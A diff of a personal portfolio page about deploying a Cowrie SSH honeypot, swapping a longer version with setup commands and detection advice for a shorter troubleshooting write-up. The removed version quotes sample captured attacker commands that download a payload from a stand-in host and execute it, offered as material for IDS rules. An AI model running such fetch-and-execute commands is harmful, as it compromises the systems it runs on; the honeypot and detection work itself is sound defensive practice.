@@ -1,129 +1,94 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Cowrie Honeypot - Christian Galvez</title>
-  <link rel="stylesheet" href="../assets/styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cowrie SSH Honeypot on DigitalOcean</title>
   <style>
-    main { max-width:900px; margin:30px auto; padding:0 20px; }
-    pre { background:#f3f4f6; padding:12px; overflow:auto; border-radius:6px; }
-    .artifact-list a { color:#003366; }
-    .meta { color:#666; font-size:0.95rem; margin-bottom:8px; }
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      background-color: #f9f9f9;
+      color: #333;
+      margin: 0;
+      padding: 0 20px;
+    }
+    header, main {
+      max-width: 900px;
+      margin: auto;
+      padding: 20px;
+    }
+    h1, h2, h3 {
+      color: #1a3c6e;
+    }
+    img {
+      display: block;
+      margin: 20px auto;
+      max-width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .back-link {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 8px 12px;
+      background: #1a3c6e;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 4px;
+    }
+    .back-link:hover {
+      background: #274a8c;
+    }
   </style>
 </head>
 <body>
-  <!-- Navbar -->
-  <header class="navbar">
-    <nav>
-      <ul>
-        <li><a href="../index.html">Home</a></li>
-        <li><a href="../about.html">About</a></li>
-        <li><a href="../projects.html">Projects</a></li>
-        <li><a href="../contact.html">Contact</a></li>
-      </ul>
-    </nav>
+  <header>
+    <h1>🕵️‍♂️ Cowrie SSH Honeypot on DigitalOcean</h1>
+    <h3>Overview</h3>
+    <p>
+      This project involved deploying Cowrie, a medium-interaction SSH honeypot, on a DigitalOcean droplet. 
+      The honeypot is designed to log brute-force attempts, shell interaction, and file transfers made by unauthorized users.
+    </p>
   </header>
 
   <main>
-    <section class="hero">
-      <h1>Cowrie Honeypot Deployment</h1>
-      <p><strong>One-line summary:</strong> Deployed Cowrie SSH/Telnet honeypot to capture attacker behavior, harvest IoCs, and test logging/alerting pipelines.</p>
-    </section>
+    <h2>🎯 Objectives</h2>
+    <ul>
+      <li>Deploy Cowrie in a secure, isolated environment.</li>
+      <li>Capture unauthorized login attempts and attacker activity.</li>
+      <li>Learn the pitfalls of configuring a honeypot in a modern Linux environment (Ubuntu 24.04).</li>
+      <li>Build real-world troubleshooting experience with Python venvs, system security restrictions, and firewall configuration.</li>
+    </ul>
 
-    <section>
-      <p class="meta"><strong>Role:</strong> Lab implementer / detection engineer &nbsp; | &nbsp; <strong>Tools:</strong> Cowrie, Python, Docker, Ubuntu 22.04, Fail2Ban, Elastic Stack (optional)</p>
-    </section>
+    <h2>🛠️ Setup Process</h2>
+    <ol>
+      <li>Provisioned a DigitalOcean Ubuntu 24.04 droplet.</li>
+      <li>Created a dedicated <code>cowrieuser</code> account (never running Cowrie as root).</li>
+      <li>Cloned the Cowrie repository and set up a Python virtual environment.</li>
+      <li>Resolved PEP 668 issues with Ubuntu’s “externally managed environments” by rebuilding the virtual environment as a non-root user.</li>
+      <li>Installed dependencies via <code>requirements.txt</code> inside the venv.</li>
+      <li>Configured firewall rules and ensured the honeypot port (2222) was exposed externally.</li>
+      <li>Launched Cowrie and verified it was logging unauthorized attempts.</li>
+    </ol>
 
-    <section>
-      <h2>Objective</h2>
-      <p>Run a low-interaction SSH/Telnet honeypot to collect attacker commands, payloads, and indicators of compromise. Validate log ingestion into SIEM and produce actionable detections.</p>
-    </section>
+    <img src="https://github.com/user-attachments/assets/80741a88-c0d1-4b9a-9563-c13ad2ed31aa" alt="Login Attempts to Honeypot" />
+    <img src="https://github.com/user-attachments/assets/27216cc6-0644-40a7-89aa-9f0371782237" alt="SSH attempt to honeypot" />
 
-    <section>
-      <h2>Minimal topology</h2>
-      <pre>
-Host (management) - 10.0.2.10
-Cowrie Honeypot VM/container - 10.0.2.20 (exposed on SSH/Telnet ports)
-Optional: Log collector (Elastic/Logstash/Beats) - 10.0.2.30
-      </pre>
-      <p>For a hardened production-style test, isolate honeypot on host-only or VLAN and block outbound http/ftp to prevent actual data exfiltration.</p>
-    </section>
+    <h2>🔧 Learning Moments / Troubleshooting</h2>
+    <p><strong>Python packaging restrictions (PEP 668):</strong> Ubuntu 24.04 blocks pip installs in system-managed environments. I learned to rebuild the venv properly as a non-root user to avoid externally-managed-environment errors.</p>
+    <p><strong>Permission issues:</strong> Accidentally building the venv as root caused Cowrie to point to /root Python paths, breaking execution. Fixing this reinforced the importance of least-privilege operation.</p>
+    <p><strong>Firewall configuration:</strong> “Connection timed out” errors highlighted the need to open honeypot ports both in UFW and in the cloud provider’s firewall.</p>
+    <p><strong>Logs as validation:</strong> Seeing unauthorized SSH attempts appear in Cowrie’s logs confirmed the deployment was successful and actively interacting with attackers.</p>
 
-    <section>
-      <h2>Deployment steps (concise)</h2>
-      <ol>
-        <li>Provision Ubuntu 22.04 VM (or container host).</li>
-        <li>Install dependencies (Python3, virtualenv, git): 
-          <pre><code>sudo apt update && sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev build-essential</code></pre>
-        </li>
-        <li>Clone Cowrie and create venv:
-          <pre><code>git clone https://github.com/cowrie/cowrie.git
-cd cowrie
-python3 -m venv cowrie-env
-source cowrie-env/bin/activate
-pip install --upgrade pip
-pip install -r requirements.txt</code></pre>
-        </li>
-        <li>Copy sample config and edit `cowrie.cfg` (set ssh/telnet ports, logging destinations):
-          <pre><code>cp etc/cowrie.cfg.dist etc/cowrie.cfg
-# edit etc/cowrie.cfg - set [ssh], [telnet], logging, and enabled sensors</code></pre>
-        </li>
-        <li>Start Cowrie:
-          <pre><code>bin/cowrie start</code></pre>
-          Or for Docker: use the project's Dockerfile or a vetted container image and mount `cowrie.cfg` and `data` for persistence.
-        </li>
-        <li>Forward logs to your collector (optional):
-          <pre><code># Example: configure Filebeat to send cowrie log files to Logstash/Elastic</code></pre>
-        </li>
-      </ol>
-    </section>
+    <h2>📑 Results</h2>
+    <p>
+      Cowrie is actively recording brute force attempts and commands from unauthorized IPs.
+      Logs show attacker usernames, password guesses, and attempted commands. 
+      This provides both educational insight into real-world attack behavior and data I can use for further analysis projects.
+    </p>
 
-    <section>
-      <h2>Example artifacts (what to capture)</h2>
-      <ul class="artifact-list">
-        <li><a href="../assets/cowrie-session.log" target="_blank">cowrie session logs (upload)</a></li>
-        <li><a href="../assets/cowrie-commands.txt" target="_blank">harvested commands (txt)</a></li>
-        <li><a href="../assets/cowrie-sample-ioct.json" target="_blank">sample IOC export (JSON)</a></li>
-      </ul>
-      <p>Upload these into <code>/assets</code> and keep names exact or edit links accordingly.</p>
-    </section>
-
-    <section>
-      <h2>Findings & examples</h2>
-      <p>Typical attacker behavior collected:</p>
-      <pre><code>2025-07-01T12:34:56Z - ssh login attempt - user: root - pass: admin
-2025-07-01T12:35:12Z - executed: wget http://malicious.example/payload -O /tmp/p
-2025-07-01T12:35:45Z - executed: chmod +x /tmp/p; /tmp/p</code></pre>
-      <p>These give you IPs, domains, and exact commands you can use to write IDS rules and blocking policies.</p>
-    </section>
-
-    <section>
-      <h2>Detection & remediation</h2>
-      <ul>
-        <li>Create IDS signatures for common command patterns and download URLs captured by Cowrie.</li>
-        <li>Block or sinkhole malicious domains at DNS/edge when confirmed.</li>
-        <li>Throttle/blacklist repeated brute-force sources using firewall rules and Fail2Ban.</li>
-      </ul>
-    </section>
-
-    <section>
-      <h2>Safety and ethics</h2>
-      <p>Run honeypots in isolated networks and never forward captured malware to production systems. Ensure legal/acceptable use and that your lab cannot be used to pivot to external targets.</p>
-    </section>
-
-    <section>
-      <h2>TL;DR (for hiring managers)</h2>
-      <ul>
-        <li>Deployed Cowrie to capture attacker TTPs and artifacts.</li>
-        <li>Produced logs and IOCs used to create detection rules and blocking lists.</li>
-        <li>All work done in isolated lab; artifacts available for review.</li>
-      </ul>
-    </section>
+    <a class="back-link" href="writeups.html">⬅️ Back to Writeups</a>
   </main>
-
-  <footer>
-    <p>© 2025 Christian Galvez</p>
-  </footer>
 </body>
 </html>
